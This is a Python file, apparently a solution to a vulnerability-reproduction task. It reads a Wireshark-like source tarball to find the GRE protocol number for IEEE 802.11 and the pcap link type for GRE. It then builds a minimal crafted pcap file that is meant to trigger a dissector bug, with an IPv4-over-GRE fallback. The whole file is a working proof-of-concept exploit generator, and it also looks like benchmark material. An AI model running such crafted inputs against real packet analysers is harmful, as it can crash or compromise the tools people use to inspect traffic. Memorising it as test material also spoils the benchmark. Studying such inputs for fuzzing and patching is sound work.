import tarfile
import re
import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategies:
        1. Attempt to find the specific DLT for GRE in the provided source code (pcap-common.c).
           If found, generate a minimal PCAP (Header + GRE + 1 byte payload) = 45 bytes.
        2. Attempt to find the specific GRE protocol value for IEEE 802.11 in packet-ieee80211.c.
        3. Fallback to DLT_RAW (IPv4) -> GRE -> 802.11 if DLT_GRE not found.
        """
        
        # Defaults
        gre_proto_80211 = 0x2452
        pcap_dlt = 101  # Default to DLT_RAW (IPv4)
        found_dlt_gre = False
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                # Iterate through tar members to find relevant files
                for member in tar.getmembers():
                    if member.name.endswith('packet-ieee80211.c'):
                        f = tar.extractfile(member)
                        content = f.read().decode('utf-8', errors='ignore')
                        # Find dissector registration: dissector_add_uint("gre.proto", <VAL>, ...)
                        m = re.search(r'dissector_add_uint\s*\(\s*"gre.proto"\s*,\s*([A-Za-z0-9_]+)', content)
                        if m:
                            val_str = m.group(1)
                            if val_str.startswith('0x') or val_str.isdigit():
                                gre_proto_80211 = int(val_str, 0)
                            else:
                                # Find define macro
                                m_def = re.search(r'#define\s+' + re.escape(val_str) + r'\s+(0x[0-9a-fA-F]+|\d+)', content)
                                if m_def:
                                    gre_proto_80211 = int(m_def.group(1), 0)
                                    
                    elif member.name.endswith('pcap-common.c'):
                        f = tar.extractfile(member)
                        content = f.read().decode('utf-8', errors='ignore')
                        # Find mapping: { <DLT>, WTAP_ENCAP_GRE }
                        m = re.search(r'\{\s*(\d+)\s*,\s*WTAP_ENCAP_GRE\s*\}', content)
                        if m:
                            pcap_dlt = int(m.group(1))
                            found_dlt_gre = True
        except Exception:
            # Fallback to defaults if source analysis fails
            pass
            
        # Build PCAP
        # Global Header: Magic(4) + Ver(2+2) + Zone(4) + Sig(4) + Snap(4) + Network(4)
        # Magic: 0xa1b2c3d4 (Little Endian)
        gh = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, pcap_dlt)
        
        pkt_data = b''
        
        if found_dlt_gre:
            # Optimal case: Direct GRE encapsulation
            # GRE Header: Flags(2) + Proto(2)
            # Flags = 0, Proto = gre_proto_80211
            gre_hdr = struct.pack('!HH', 0, gre_proto_80211)
            pkt_data = gre_hdr + b'\x00' # 1 byte payload
        else:
            # Fallback case: IPv4 -> GRE -> 802.11
            # GRE Header
            gre_hdr = struct.pack('!HH', 0, gre_proto_80211)
            payload = gre_hdr + b'\x00'
            
            # IPv4 Header construction
            # Version=4, IHL=5 -> 0x45
            total_len = 20 + len(payload)
            src_ip = b'\x7f\x00\x00\x01'
            dst_ip = b'\x7f\x00\x00\x01'
            proto = 47 # GRE
            
            # Pack header with 0 checksum
            ip_pre = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0x1234, 0, 64, proto, 0, src_ip, dst_ip)
            
            # Calculate Checksum
            s = 0
            for i in range(0, len(ip_pre), 2):
                w = (ip_pre[i] << 8) + ip_pre[i+1]
                s += w
            while (s >> 16):
                s = (s & 0xFFFF) + (s >> 16)
            checksum = ~s & 0xFFFF
            
            # Pack header with checksum
            ip_hdr = struct.pack('!BBHHHBBH4s4s', 0x45, 0, total_len, 0x1234, 0, 64, proto, checksum, src_ip, dst_ip)
            
            pkt_data = ip_hdr + payload
            
        # Packet Header: Ts(4+4) + InclLen(4) + OrigLen(4)
        ts = 0
        incl_len = len(pkt_data)
        orig_len = len(pkt_data)
        ph = struct.pack('<LLLL', ts, ts, incl_len, orig_len)
        
        return gh + ph + pkt_data